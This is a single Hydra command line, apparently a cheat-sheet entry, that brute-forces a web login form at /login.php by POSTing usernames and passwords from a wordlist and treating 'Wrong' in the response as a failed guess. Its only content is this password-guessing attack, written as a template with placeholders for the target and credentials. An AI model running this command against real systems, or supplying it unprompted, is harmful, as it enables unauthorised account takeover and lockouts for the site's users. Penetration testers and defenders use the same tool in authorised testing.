
hydra -l "USERNAME" -P "WORDLIST" "IP or HOSTNAME" http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V



